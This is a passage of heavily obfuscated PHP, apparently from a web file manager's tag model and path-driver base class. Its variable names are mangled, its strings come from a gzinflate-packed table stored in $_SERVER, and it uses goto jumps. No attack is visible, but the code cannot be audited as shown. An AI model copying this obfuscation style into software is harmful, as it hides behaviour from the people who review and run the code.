$¢ÉÀßëÛ = $´ìäÇÅŒ[$¹òÛç™ƒ[455]] == $¹òÛç™ƒ[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¹òÛç™ƒ[865])->move($´ìäÇÅŒ[$¹òÛç™ƒ[183]], $à½Æ, $¢ÉÀßëÛ); } Model($¹òÛç™ƒ[865])->moveClearAuth = !0; $‚‰Ì¿Ğ = array($¹òÛç™ƒ[180] => 2, $¹òÛç™ƒ[541] => $…ñş”É¥); $°ªÜŒªÜ = array($¹òÛç™ƒ[541] => $ƒ¾ö¢¹é); Model($¹òÛç™ƒ[2001])->where($‚‰Ì¿Ğ)->save($°ªÜŒªÜ); Model($¹òÛç™ƒ[2002])->where($‚‰Ì¿Ğ)->save($°ªÜŒªÜ); } $this->_changeChildLevel($Ôœ®ÜÑÇ[$…ñş”É¥], $Ôœ®ÜÑÇ[$ƒ¾ö¢¹é], !0); $this->where(array($¹òÛç™ƒ[182] => $…ñş”É¥))->save(array($¹òÛç™ƒ[182] => $ƒ¾ö¢¹é)); $this->_clearChildrenCache($Ôœ®ÜÑÇ[$ƒ¾ö¢¹é]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($ç”É‚Ò…) { $›¢‘ı«½ =& $_SERVER[èùÙ¹Ïö]; return array($›¢‘ı«½[2003] => array($ç”É‚Ò…[0], $›¢‘ı«½[2004]), $›¢‘ı«½[2005] => array($ç”É‚Ò…[0], $›¢‘ı«½[2006])); } protected function get($Õ¾”ğ·) { $’µ¾—ÀÅ =& $_SERVER[èùÙ¹Ïö]; $Öóæ „Å = Model($’µ¾—ÀÅ[557])->metaGet($Õ¾”ğ·, $’µ¾—ÀÅ[2007]); $áĞÍì½ó = json_decode($Öóæ „Å, !0); return $áĞÍì½ó ? $áĞÍì½ó : array($’µ¾—ÀÅ[2008] => $’µ¾—ÀÅ[90], $’µ¾—ÀÅ[415] => array()); } protected function set($´‚Äœ±è, $ı×€ÌËˆ) { $ÚÃêÚœÈ =& $_SERVER[èùÙ¹Ïö]; $ı×€ÌËˆ = $ı×€ÌËˆ ? $ı×€ÌËˆ : array($ÚÃêÚœÈ[2008] => $ÚÃêÚœÈ[90], $ÚÃêÚœÈ[415] => array()); return Model($ÚÃêÚœÈ[557])->metaSet($´‚Äœ±è, $ÚÃêÚœÈ[2007], json_encode($ı×€ÌËˆ)); } protected function getByTagID($¯Ó´¯ª, $öë•Â) { $Ö¾÷í°¬ =& $_SERVER[èùÙ¹Ïö]; if (!$¯Ó´¯ª || !$öë•Â) { return !1; } if (!Model($Ö¾÷í°¬[557])->getInfoSimple($¯Ó´¯ª)) { return !1; } $ğá­çï» = $this->get($¯Ó´¯ª); if (!$ğá­çï» || !isset($ğá­çï»[$Ö¾÷í°¬[415]])) { return !1; } $¾Äôø¿ï = array_find_by_field($ğá­çï»[$Ö¾÷í°¬[415]], $Ö¾÷í°¬[445], $öë•Â); return is_array($¾Äôø¿ï) ? $¾Äôø¿ï : !1; } public function listSource($ÓÁÕŒÄÇ, $Ü¢˜´ë×) { $ù²ÅîÏÓ =& $_SERVER[èùÙ¹Ïö]; if ($Ü¢˜´ë× && !is_array($Ü¢˜´ë×)) { $Ü¢˜´ë× = array($Ü¢˜´ë×); } $£°Ä”áß = $this->listData($ÓÁÕŒÄÇ); $Âª¿ëæÙ = array(); foreach ($£°Ä”áß as $Œ¹»ì˜) { $êà‰ıá° = $Œ¹»ì˜[$ù²ÅîÏÓ[86]]; if (!$êà‰ıá°) { continue; } if (!isset($Âª¿ëæÙ[$êà‰ıá°])) { $Âª¿ëæÙ[$êà‰ıá°] = array(); } $Âª¿ëæÙ[$êà‰ıá°][] = $Œ¹»ì˜[$ù²ÅîÏÓ[470]]; } $µúä®‘ = array(); foreach ($Âª¿ëæÙ as $Ÿ¼ÁÀİş => $êª°Ëõæ) { $…üğï¨‡ = !0; if (!$Ü¢˜´ë×) { $µúä®‘[] = $Ÿ¼ÁÀİş; continue; } foreach ($Ü¢˜´ë× as $œ¦†«ÍÏ) { if (!in_array($œ¦†«ÍÏ, $êª°Ëõæ)) { $…üğï¨‡ = !1; break; } } if ($…üğï¨‡) { $µúä®‘[] = $Ÿ¼ÁÀİş; } } if (!$µúä®‘) { return array(); } $•²¸™„Ñ = array($ù²ÅîÏÓ[461] => array($ù²ÅîÏÓ[462], $µúä®‘), $ù²ÅîÏÓ[541] => $ÓÁÕŒÄÇ, $ù²ÅîÏÓ[180] => SourceModel::TYPE_GROUP); $çÙ¹´æè = Model($ù²ÅîÏÓ[1381])->listSource($•²¸™„Ñ); if (!$çÙ¹´æè || count($µúä®‘) == $çÙ¹´æè[$ù²ÅîÏÓ[412]][$ù²ÅîÏÓ[413]]) { return $çÙ¹´æè; } $ÀŞìÚÜÌ = array(); $ˆİôöŞ‹ = array_to_keyvalue($çÙ¹´æè[$ù²ÅîÏÓ[84]], $ù²ÅîÏÓ[12], $ù²ÅîÏÓ[183]); $ô°¼Šô‘ = array_to_keyvalue($çÙ¹´æè[$ù²ÅîÏÓ[85]], $ù²ÅîÏÓ[12], $ù²ÅîÏÓ[183]); $½ª°ÙĞ = array_merge($ô°¼Šô‘, $ˆİôöŞ‹); foreach ($µúä®‘ as $êà‰ıá°) { if (!in_array($êà‰ıá°, $½ª°ÙĞ)) { $ÀŞìÚÜÌ[] = $êà‰ıá°; } } if ($ÀŞìÚÜÌ) { $this->removeBySource($ÓÁÕŒÄÇ, $ÀŞìÚÜÌ); } return $çÙ¹´æè; } protected function listData($´¹ÜÍ§³) { $ÛÀÔêšì =& $_SERVER[èùÙ¹Ïö]; $“Ñæ’”Ô = array($ÛÀÔêšì[1687] => 0, $ÛÀÔêšì[528] => array($ÛÀÔêšì[2009], 0), $ÛÀÔêšì[466] => $ÛÀÔêšì[2010] . $´¹ÜÍ§³); $‚ŠëõÈŞ = $ÛÀÔêšì[2011]; $òä·É§£ = $this->field($‚ŠëõÈŞ)->where($“Ñæ’”Ô)->order($ÛÀÔêšì[2012])->select(); return $òä·É§£ ? $òä·É§£ : array(); } protected function addToTag($ÓäÇÕÓë, $›³êÊŸ™, $¶ÔÀÊÑ) { $Ÿ¡œùõ =& $_SERVER[èùÙ¹Ïö]; if (!$this->getByTagID($ÓäÇÕÓë, $¶ÔÀÊÑ) || !$›³êÊŸ™) { return !1; } if (!Model($Ÿ¡œùõ[865])->pathInfo($›³êÊŸ™)) { return !1; } $å‘ùÀÛ® = array($Ÿ¡œùõ[1687] => 0, $Ÿ¡œùõ[528] => $¶ÔÀÊÑ, $Ÿ¡œùõ[465] => $›³êÊŸ™, $Ÿ¡œùõ[466] => $Ÿ¡œùõ[2013] . $ÓäÇÕÓë, $Ÿ¡œùõ[464] => $Ÿ¡œùõ[12], $Ÿ¡œùõ[1898] => 0); if ($this->where($å‘ùÀÛ®)->find()) { return !1; } return $this->add($å‘ùÀÛ®); } protected function removeFromTag($ÒíŸ¹”‹, $œ¬ã¾ÌÛ, $Ï÷ÚåüÔ) { $ÇşôİÓ” =& $_SERVER[èùÙ¹Ïö]; if (!$this->getByTagID($ÒíŸ¹”‹, $Ï÷ÚåüÔ) || !$œ¬ã¾ÌÛ) { return !1; } if (is_array($œ¬ã¾ÌÛ)) { $œ¬ã¾ÌÛ = array($ÇşôİÓ”[7], $œ¬ã¾ÌÛ); } $ïï§¬ßÏ = array($ÇşôİÓ”[1687] => 0, $ÇşôİÓ”[528] => $Ï÷ÚåüÔ, $ÇşôİÓ”[466] => $ÇşôİÓ”[2013] . $ÒíŸ¹”‹, $ÇşôİÓ”[465] => $œ¬ã¾ÌÛ); return $this->where($ïï§¬ßÏ)->delete(); } protected function removeByTag($Î®ºİ·©, $‡½¼ûä¾) { $ÈÈ¾ÈÆ =& $_SERVER[èùÙ¹Ïö]; if (!$this->getByTagID($Î®ºİ·©, $‡½¼ûä¾)) { return !1; } $úÕ å´ = array($ÈÈ¾ÈÆ[1687] => 0, $ÈÈ¾ÈÆ[528] => $‡½¼ûä¾, $ÈÈ¾ÈÆ[466] => $ÈÈ¾ÈÆ[2013] . $Î®ºİ·©); return $this->where($úÕ å´)->delete(); } protected function removeBySource($ ü¯ŸÔü, $ç²ï½£Ë) { $ÅÈãÏÅ =& $_SERVER[èùÙ¹Ïö]; if (!$ ü¯ŸÔü || !$ç²ï½£Ë) { return !1; } if (is_array($ç²ï½£Ë)) { $ç²ï½£Ë = array($ÅÈãÏÅ[7], $ç²ï½£Ë); } $ó°´•¦ = array($ÅÈãÏÅ[1687] => 0, $ÅÈãÏÅ[465] => $ç²ï½£Ë, $ÅÈãÏÅ[528] => array($ÅÈãÏÅ[1060], 0), $ÅÈãÏÅ[466] => $ÅÈãÏÅ[2013] . $ ü¯ŸÔü); return $this->where($ó°´•¦)->delete(); } } goto eË†­Ö¢ğ; dóšÁñŸ™: $_SERVER[€ÇÉªãÇ] = explode($_SERVER[èùÙ¹Ïö][652], gzinflate(substr($_SERVER[èùÙ¹Ïö][653], 10, -8))); $xigujhvesd = $_SERVER[èùÙ¹Ïö][654]; while (strlen($xigujhvesd) < $_SERVER[èùÙ¹Ïö][655]) { if (!$xigujhvesd) { break; } $xigujhvesd++; } goto f´Ğ²©„•Î; DøÉŒÒ§É¿: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $°°ìÆ÷ =& $_SERVER[èùÙ¹Ïö]; $this->objectDriver = array($°°ìÆ÷[60], $°°ìÆ÷[61], $°°ìÆ÷[62], $°°ìÆ÷[63], $°°ìÆ÷[64], $°°ìÆ÷[65], $°°ìÆ÷[66], $°°ìÆ÷[67], $°°ìÆ÷[68], $°°ìÆ÷[69], $°°ìÆ÷[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($éç ÈÄË) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($éç ÈÄË, $_SERVER[èùÙ¹Ïö][8]); } return $éç ÈÄË; } public function iconvApp($¾ÔâŒââ) { return $¾ÔâŒââ; } public function iconvSystem($’áòÁˆ˜) { return $’áòÁˆ˜; } public function iconvTo($‹Ö±×»£, $ğ¦ì’ı, $¤„ÃÖùÃ) { $—¬öÇ‚ =& $_SERVER[èùÙ¹Ïö]; if (!$‹Ö±×»£ || !function_exists($—¬öÇ‚[71])) { return $‹Ö±×»£; } static $ÉÎ–×º = array(); $×€ŒÃ‰ = $ğ¦ì’ı . $—¬öÇ‚[72] . $¤„ÃÖùÃ . $—¬öÇ‚[73] . $‹Ö±×»£; if (isset($ÉÎ–×º[$×€ŒÃ‰])) { return $ÉÎ–×º[$×€ŒÃ‰]; } if (function_exists($—¬öÇ‚[74])) { $ÇÍ¼ › = @mb_convert_encoding($‹Ö±×»£, $¤„ÃÖùÃ, $ğ¦ì’ı); } else { $ÇÍ¼ › = @iconv($ğ¦ì’ı, $¤„ÃÖùÃ, $‹Ö±×»£); } $ÇÍ¼ › = $ÇÍ¼ › ? $ÇÍ¼ › : $‹Ö±×»£; if (strstr($ÇÍ¼ ›, $—¬öÇ‚[75])) { $ÇÍ¼ › = str_replace($—¬öÇ‚[75], $—¬öÇ‚[11], $ÇÍ¼ ›); } $ÉÎ–×º[$ğ¦ì’ı . $—¬öÇ‚[72] . $¤„ÃÖùÃ . $—¬öÇ‚[73] . $‹Ö±×»£] = $ÇÍ¼ ›; $ÉÎ–×º[$¤„ÃÖùÃ . $—¬öÇ‚[72] . $ğ¦ì’ı . $—¬öÇ‚[73] . $‹Ö±×»£] = $‹Ö±×»£; $ÉÎ–×º[$¤„ÃÖùÃ . $—¬öÇ‚[72] . $ğ¦ì’ı . $—¬öÇ‚[73] . $ÇÍ¼ ›] = $‹Ö±×»£; $ÉÎ–×º[$ğ¦ì’ı . $—¬öÇ‚[72] . $¤„ÃÖùÃ . $—¬öÇ‚[73] . $ÇÍ¼ ›] = $ÇÍ¼ ›; return $ÇÍ¼ ›; } public function getPathInner($Ç¯©£ıÜ) { $‚î°ÄŸœ = IO::init($Ç¯©£ıÜ); return $‚î°ÄŸœ->path; } public function getPathOuter($àûä‰¿ò) { $´Îò¿å =& $_SERVER[èùÙ¹Ïö]; $ÜÁŒÅ– = strlen(trim($this->pathBase, $´Îò¿å[8])); $àûä‰¿ò = substr(trim($àûä‰¿ò, $´Îò¿å[8]), $ÜÁŒÅ–); return $this->pathDriver . $´Îò¿å[8] . ltrim($àûä‰¿ò, $´Îò¿å[8]); } public function isParentOf($Ú‹ÖÏÍ¦, $ÔŸê´Ò) { $åúüÏæ™ =& $_SERVER[èùÙ¹Ïö]; $Ú‹ÖÏÍ¦ = rtrim(strtolower($Ú‹ÖÏÍ¦), $åúüÏæ™[8]) . $åúüÏæ™[8]; $ÔŸê´Ò = rtrim(strtolower($ÔŸê´Ò), $åúüÏæ™[8]) . $åúüÏæ™[8]; $ÖôõßÔó = strpos($ÔŸê´Ò, $Ú‹ÖÏÍ¦) === 0; return $ÖôõßÔó; } public function getType() { $¡Ù’áì =& $_SERVER[èùÙ¹Ïö]; $ÇıÓÄŠÈ = str_replace($¡Ù’áì[76], $¡Ù’áì[12], get_class($this)); return strtolower($ÇıÓÄŠÈ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ìŒÊ¨Å¾, $„¥Ø­úÒ) { $Åâ‰£‚ =& $_SERVER[èùÙ¹Ïö]; $·§Ì×íº = rtrim($ìŒÊ¨Å¾, $Åâ‰£‚[8]) . $Åâ‰£‚[8] . $„¥Ø­úÒ; $ØÛ¤‡¦½ = $this->exist($·§Ì×íº); return $ØÛ¤‡¦½ ? $·§Ì×íº : !1; } public function setModifyTime($Æ¯ë¶„, $„Á››ì™ = '') { } public function renameObject($ôÉ¹ºŒé, $ÅÄ‚¿´Ò) { $ì²Ô¥ŠÉ = $ÅÄ‚¿´Ò; $ôÉ¹ºŒé = $this->getPathOuter($ôÉ¹ºŒé); $ÅÄ‚¿´Ò = $this->pathFather($ôÉ¹ºŒé) . $ÅÄ‚¿´Ò; $»Û‡ü´‘ = IO::copy($ôÉ¹ºŒé, $this->pathFather($ôÉ¹ºŒé), REPEAT_RENAME_FOLDER, $ì²Ô¥ŠÉ); if ($»Û‡ü´‘) { IO::remove($ôÉ¹ºŒé); } return $»Û‡ü´‘ ? $ÅÄ‚¿´Ò : !1; } public function tempFile($´„Ò’³ï = '', $ö»££‹È = '') { if (!$´„Ò’³ï) { $´„Ò’³ï = rand_string(15); } $¨Ã½Ô = TEMP_FILES . rand_string(15) . $_SERVER[èùÙ¹Ïö][8]; @mkdir($¨Ã½Ô, DEFAULT_PERRMISSIONS, !0); $­ç›ÍË÷ = $¨Ã½Ô . $´„Ò’³ï; @touch($­ç›ÍË÷); if ($ö»££‹È) { file_put_contents($­ç›ÍË÷, $ö»££‹È); } return $­ç›ÍË÷; } public function tempFileRemve($†»íğ©) { @unlink($†»íğ©); @rmdir($this->pathFather($†»íğ©)); } public function mkfile($Æ€äÑ®÷, $ø´’Ê‹ø = '', $°Úá×¬¨ = REPEAT_RENAME) { } public function mkdir($×—ù½Î©, $¶ÄÄ÷ı = REPEAT_SKIP) { } public function delFile($ö‰£ÒğÒ) { } public function delFolder($ßòààƒŠ) { } public function copyFile($øÂ¦¬ê, $¡™ì¯‚Ô) { } public function moveFile($ŸÅ‰à¹¹, $ÔÇê¤Õ•) { } public function remove($¡²âá£‚) { if ($this->isFile($¡²âá£‚)) { return $this->delFile($¡²âá£‚); } return $this->delFolder($¡²âá£‚); } public function rename($çãÒİø®, $ÂÓ–›ß) { } public function exist($¹ŞÎÆ¿ú) { } public function findByHash($ê³ÏíÖ = '', $ˆ¸ë‹ª¸ = '') { return !1; } public function isFile($‹´±¬ˆ) { } public function isFolder($„¡°‚ÂÑ) { } public function size($ƒ£Áß¾€) { } public function info($†í“Ôûó) { } public function infoSimple($™ŒéÊ‰˜) { return $this->info($™ŒéÊ‰˜); } public function infoAuth($øç‘ë“ ) { return $this->info($øç‘ë“ ); } public function infoFull($ôÊ¶ãÆ¼) { return $this->info($ôÊ¶ãÆ¼); } public function infoFullSimple($ìÒ¹¬ª·) { return $this->info($ìÒ¹¬ª·); } public function infoWithChildren($†åİè×î) { $°Ÿñ¥–˜ =& $_SERVER[èùÙ¹Ïö]; static $¡íµ¡ªè = array(); if (isset($¡íµ¡ªè[$†åİè×î])) { return $¡íµ¡ªè[$†åİè×î]; } $¹‡ŒÉÆÔ = $this->info($†åİè×î); if ($¹‡ŒÉÆÔ && $¹‡ŒÉÆÔ[$°Ÿñ¥–˜[33]] == $°Ÿñ¥–˜[77]) { $„Í‚â§ú = array($°Ÿñ¥–˜[78] => 0, $°Ÿñ¥–˜[79] => 0, $°Ÿñ¥–˜[80] => 0); $this->infoChildren($†åİè×î, $„Í‚â§ú); $¹‡ŒÉÆÔ[$°Ÿñ¥–˜[78]] = $„Í‚â§ú[$°Ÿñ¥–˜[78]]; $¹‡ŒÉÆÔ[$°Ÿñ¥–˜[81]] = array($°Ÿñ¥–˜[82] => $„Í‚â§ú[$°Ÿñ¥–˜[79]], $°Ÿñ¥–˜[83] => $„Í‚â§ú[$°Ÿñ¥–˜[80]]); $¡íµ¡ªè[$†åİè×î] = $¹‡ŒÉÆÔ; } return $¹‡ŒÉÆÔ; } public function listPath($ÙÍå‰”, $ûÉ¥œî = false) { } public function has($ÑÒ±íËİ, $ÙÄö¨ê = false, $í¿ª¡ë = false) { } public function canRead($¤‰ØêØ•) { } public function canWrite($Ï…·æş) { } public function getContent($¿ùà§îÌ) { } public function setContent($¬Ãàí¥µ, $ö°¥ãí– = '') { } protected function infoChildren($ôÆˆôë, &$¯ÏêŸıº) { $ê†‘û¬ =& $_SERVER[èùÙ¹Ïö]; check_abort_echo(); $å·…ê¼Š = $this->listPath($ôÆˆôë, !0); $å·…ê¼Š = array_merge($å·…ê¼Š[$ê†‘û¬[84]], $å·…ê¼Š[$ê†‘û¬[85]]); foreach ($å·…ê¼Š as $†ĞÌ§ñš) { if ($†ĞÌ§ñš[$ê†‘û¬[33]] == $ê†‘û¬[77]) { $¯ÏêŸıº[$ê†‘û¬[80]]++; $êÊ¯¬åÔ = $this->getPathInner($†ĞÌ§ñš[$ê†‘û¬[86]]); $this->infoChildren($êÊ¯¬åÔ, $¯ÏêŸıº); } else { $¯ÏêŸıº[$ê†‘û¬[79]]++; $¯ÏêŸıº[$ê†‘û¬[78]] += $†ĞÌ§ñš[$ê†‘û¬[78]]; } } } public function fileSubstr($ß‚îœ³‡, $·»ì‰œ€, $Ş¢öØ÷ƒ) { } public function listAll($æ’ø½ã) { } public function listAllMake($¹æ³‡®æ, &$°§šü¾‰) { $ÑÁğ®¡Ì =& $_SERVER[èùÙ¹Ïö]; check_abort_echo(); $‘û—ªãñ = $this->listPath($¹æ³‡®æ, !0); if (!$‘û—ªãñ) { return; } $ƒâÀÈ¼« = array_merge($‘û—ªãñ[$ÑÁğ®¡Ì[84]], $‘û—ªãñ[$ÑÁğ®¡Ì[85]]); foreach ($ƒâÀÈ¼« as $†¦‘Î¶ì) { $•Ãı† = $†¦‘Î¶ì[$ÑÁğ®¡Ì[33]] == $ÑÁğ®¡Ì[77]; $õ¯êè¸ø = array($ÑÁğ®¡Ì[86] => $†¦‘Î¶ì[$ÑÁğ®¡Ì[86]], $ÑÁğ®¡Ì[77] => $•Ãı†); if (isset($†¦‘Î¶ì[$ÑÁğ®¡Ì[78]])) { $õ¯êè¸ø[$ÑÁğ®¡Ì[78]] = $†¦‘Î¶ì[$ÑÁğ®¡Ì[78]]; } if (isset($†¦‘Î¶ì[$ÑÁğ®¡Ì[87]])) { $õ¯êè¸ø[$ÑÁğ®¡Ì[87]] = $†¦‘Î¶ì[$ÑÁğ®¡Ì[87]]; } if (!$•Ãı†) { $°§šü¾‰[] = $õ¯êè¸ø; continue; } $°§šü¾‰[] = $õ¯êè¸ø; $’Å—Å«˜ = $†¦‘Î¶ì[$ÑÁğ®¡Ì[86]]; $«ü’æËä = $this->pathDriver; if (substr($†¦‘Î¶ì[$ÑÁğ®¡Ì[86]], 0, strlen($«ü’æËä)) == $«ü’æËä) { $’Å—Å«˜ = substr($’Å—Å«˜, strlen($«ü’æËä)); } $this->listAllMake($’Å—Å«˜, $°§šü¾‰); } } public function listAllSimple($úßøï’«, $İá“Œ¶ = false) { $ÊØÖÕõ™ = $this->listAll($úßøï’«); return $this->listAllSimpleMake($ÊØÖÕõ™, $this->getPathOuter($úßøï’«), $İá“Œ¶); } public function listAllSimpleMake($Ã…±ª£Ö, $ˆÑ¬Ú¡ò, $šŞÆç²«) { $÷˜²æµÈ =& $_SERVER[èùÙ¹Ïö]; $¬‹áÆ³Ş = array(); $ˆÑ¬Ú¡ò = rtrim(get_path_father($ˆÑ¬Ú¡ò), $÷˜²æµÈ[8]) . $÷˜²æµÈ[8]; foreach ($Ã…±ª£Ö as $¥ƒšÛÇ) { $õÛ¢– = array($÷˜²æµÈ[86] => $¥ƒšÛÇ[$÷˜²æµÈ[86]], $÷˜²æµÈ[88] => $¥ƒšÛÇ[$÷˜²æµÈ[86]], $÷˜²æµÈ[77] => $¥ƒšÛÇ[$÷˜²æµÈ[77]]); if (isset($¥ƒšÛÇ[$÷˜²æµÈ[78]]) && !$¥ƒšÛÇ[$÷˜²æµÈ[77]]) { $õÛ¢–[$÷˜²æµÈ[78]] = $¥ƒšÛÇ[$÷˜²æµÈ[78]]; } if (isset($¥ƒšÛÇ[$÷˜²æµÈ[87]])) { $õÛ¢–[$÷˜²æµÈ[87]] = $¥ƒšÛÇ[$÷˜²æµÈ[87]]; } if (is_array($¥ƒšÛÇ[$÷˜²æµÈ[89]])) { $õÛ¢–[$÷˜²æµÈ[88]] = $¥ƒšÛÇ[$÷˜²æµÈ[89]][$÷˜²æµÈ[86]]; $õÛ¢–[$÷˜²æµÈ[78]] = $¥ƒšÛÇ[$÷˜²æµÈ[89]][$÷˜²æµÈ[78]]; $õÛ¢–[$÷˜²æµÈ[87]] = $¥ƒšÛÇ[$÷˜²æµÈ[89]][$÷˜²æµÈ[87]]; } else { if (substr($¥ƒšÛÇ[$÷˜²æµÈ[86]], 0, strlen($ˆÑ¬Ú¡ò)) == $ˆÑ¬Ú¡ò) { $õÛ¢–[$÷˜²æµÈ[86]] = substr($¥ƒšÛÇ[$÷˜²æµÈ[86]], strlen($ˆÑ¬Ú¡ò)); } } $’¢ş‡ĞÚ = $¥ƒšÛÇ[$÷˜²æµÈ[77]] ? $÷˜²æµÈ[8] : $÷˜²æµÈ[12]; $õÛ¢–[$÷˜²æµÈ[88]] = rtrim($õÛ¢–[$÷˜²æµÈ[88]], $÷˜²æµÈ[8]) . $’¢ş‡ĞÚ; $õÛ¢–[$÷˜²æµÈ[86]] = $÷˜²æµÈ[8] . trim($õÛ¢–[$÷˜²æµÈ[86]], $÷˜²æµÈ[8]) . $’¢ş‡ĞÚ; if (!$šŞÆç²«) { $îï‹îú = explode($÷˜²æµÈ[8], trim($õÛ¢–[$÷˜²æµÈ[86]], $÷˜²æµÈ[8])); $õÛ¢–[$÷˜²æµÈ[86]] = $÷˜²æµÈ[8] . implode($÷˜²æµÈ[8], array_slice($îï‹îú, 1)) . $’¢ş‡ĞÚ; } $¬‹áÆ³Ş[] = $õÛ¢–; } return array_sort_by($¬‹áÆ³Ş, $÷˜²æµÈ[86]); } public function upload($™ªî…ı, $š‰‘­ó€, $ñ¼•«¡õ = false, $ûÍè—ìÒ = REPEAT_REPLACE) { } public function uploadFileByID($Ãı«ä”Å, $Ï„¨…¥Ş, $üÑĞœÆÜ) { } public function uploadFileByPath($Ÿõ½£Í•, $Æ¿„Àó‹, $¤™Ò¬îş = array()) { } public function isUploadServer() { $¢ÛŞŸé¹ =& $_SERVER[èùÙ¹Ïö]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¢ÛŞŸé¹[90]) { return !0; } return $GLOBALS[$¢ÛŞŸé¹[6]][$¢ÛŞŸé¹[91]][$¢ÛŞŸé¹[92]]; } public function isFileOutServer() { $³ä©ìã =& $_SERVER[èùÙ¹Ïö]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $³ä©ìã[90]) { return !0; } return $GLOBALS[$³ä©ìã[6]][$³ä©ìã[91]][$³ä©ìã[93]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($É¬¬Ôï) { $» ÁÏÖ• =& $_SERVER[èùÙ¹Ïö]; if (!$this->isCdnHost()) { return $É¬¬Ôï; } return str_replace(trim(get_url_root($É¬¬Ôï), $» ÁÏÖ•[8]), trim($this->cdnHost, $» ÁÏÖ•[8]), $É¬¬Ôï); } public function uploadLink($ƒëß——ˆ, $âŞ«ğÔ = 0) { $ ´†ùÇÙ =& $_SERVER[èùÙ¹Ïö]; if ($this->isUploadServer()) { return; } $‡åïõ• = $this->getType(); if (!in_array($‡åïõ•, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¿ÏÔø§ = 1024 * 1024 * 10; $™Úõì—‰ = $âŞ«ğÔ <= $¿ÏÔø§ ? $ ´†ùÇÙ[94] : $ ´†ùÇÙ[95]; $êÕ½ú§² = (!$âŞ«ğÔ ? 1 : ceil($âŞ«ğÔ / pow(1024, 3))) * 3600 * 4; $‚¤¢†˜ = $this->{$™Úõì—‰}($ƒëß——ˆ, $êÕ½ú§²); if ($‚¤¢†˜) { $‚¤¢†˜[$ ´†ùÇÙ[96]] = $ƒëß——ˆ; $‚¤¢†˜[$ ´†ùÇÙ[97]] = $‡åïõ•; } return $‚¤¢†˜; } public function uploadFormData($Ü¾„éê², $Ê”É¼ã = 3600) { } public function multiUploadFormData($Ì°ÜéâÉ, $Ò¸‡´Àî = 3600) { } public function download($ƒ¾öèó, $úŞÛ™‡â) { } public function ext($¹¤à¯ú) { $„­üÙºò =& $_SERVER[èùÙ¹Ïö]; if (strpos($¹¤à¯ú, $„­üÙºò[8]) === -1) { $¥Å–Ò¶ø = $¹¤à¯ú; } else { $¥Å–Ò¶ø = $this->pathThis($¹¤à¯ú); } $Îî³ä³‘ = $„­üÙºò[12]; if (strstr($¥Å–Ò¶ø, $„­üÙºò[10])) { $Îî³ä³‘ = substr($¥Å–Ò¶ø, strrpos($¥Å–Ò¶ø, $„­üÙºò[10]) + 1); $Îî³ä³‘ = strtolower($Îî³ä³‘); } if (strlen($Îî³ä³‘) > 3 && preg_match($„­üÙºò[98], $Îî³ä³‘, $¦âá»¯)) { $Îî³ä³‘ = $„­üÙºò[12]; } return $Îî³ä³‘; } public function pathThis($†·ºî‹€) { $óÑ´äÚ’ =& $_SERVER[èùÙ¹Ïö]; $†·ºî‹€ = str_replace($óÑ´äÚ’[99], $óÑ´äÚ’[8], rtrim($†·ºî‹€, $óÑ´äÚ’[8])); $´Å—³Ã— = strrpos($†·ºî‹€, $óÑ´äÚ’[8]); if ($´Å—³Ã— === !1) { return $†·ºî‹€; } return substr($†·ºî‹€, $´Å—³Ã— + 1); } public function pathFather($„ĞéşÀ¼) { $’å–ï¯ğ =& $_SERVER[èùÙ¹Ïö]; $„ĞéşÀ¼ = str_replace($’å–ï¯ğ[99], $’å–ï¯ğ[8], rtrim($„ĞéşÀ¼, $’å–ï¯ğ[8])); $­ˆ‹ı‹¼ = strrpos($„ĞéşÀ¼, $’å–ï¯ğ[8]); if ($­ˆ‹ı‹¼ === !1) { return $’å–ï¯ğ[12]; } return substr($„ĞéşÀ¼, 0, $­ˆ‹ı‹¼ + 1); } public function hashSimple($Ğø‡÷“Ê) { $Ÿ°¦¹€ =& $_SERVER[èùÙ¹Ïö]; if (!$Ğø‡÷“Ê) { return md5($Ÿ°¦¹€[12]); } $ë³«¡Ã = $this->size($Ğø‡÷“Ê); $ÂÌİÃñî = 200; $–â¦Ášú = 50; if ($ë³«¡Ã <= $ÂÌİÃñî * $–â¦Ášú) { return $this->hashMd5($Ğø‡÷“Ê) . $ë³«¡Ã; } $ï¯Æº‡‰ = intval($ë³«¡Ã / $–â¦Ášú); $·šÜ‘ = $Ÿ°¦¹€[12]; for ($¨ø¦…€‘ = 0; $¨ø¦…€‘ < $–â¦Ášú; $¨ø¦…€‘++) { $·šÜ‘ .= $this->fileSubstr($Ğø‡÷“Ê, $ï¯Æº‡‰ * $¨ø¦…€‘, $ÂÌİÃñî); } $·šÜ‘ .= $this->fileSubstr($Ğø‡÷“Ê, $ë³«¡Ã - $ÂÌİÃñî, $ÂÌİÃñî); return md5($·šÜ‘) . $ë³«¡Ã; } public static $md5Cache = array(); public function hashMd5($³„­µ–) { if (!$³„­µ–) { return md5($_SERVER[èùÙ¹Ïö][12]); } $³„­µ– = $this->iconvSystem($³„­µ–); if (isset(self::$md5Cache[$³„­µ–])) { return self::$md5Cache[$³„­µ–]; } self::$md5Cache[$³„­µ–] = $this->hashMd5Shell($³„­µ–); if (!self::$md5Cache[$³„­µ–]) { self::$md5Cache[$³„­µ–] = @md5_file($³„­µ–); } return self::$md5Cache[$³„­µ–]; } private function hashMd5Shell($£Ü«–Šğ) { $¬×÷Û–‰ =& $_SERVER[èùÙ¹Ïö]; if (!$£Ü«–Šğ) { return md5($¬×÷Û–‰[12]); } if (!function_exists($¬×÷Û–‰[100])) { return !1; } $•Ê‰¦ÑÖ = array($¬×÷Û–‰[101], $¬×÷Û–‰[102]); $Ñ“¹ÄæÅ = Cache::get($¬×÷Û–‰[103]); if (!$Ñ“¹ÄæÅ) { $Í¥Â¢¬€ = BASIC_PATH . $¬×÷Û–‰[104]; $Şí›®‘ = md5_file($Í¥Â¢¬€); $Ñ“¹ÄæÅ = $¬×÷Û–‰[105]; foreach 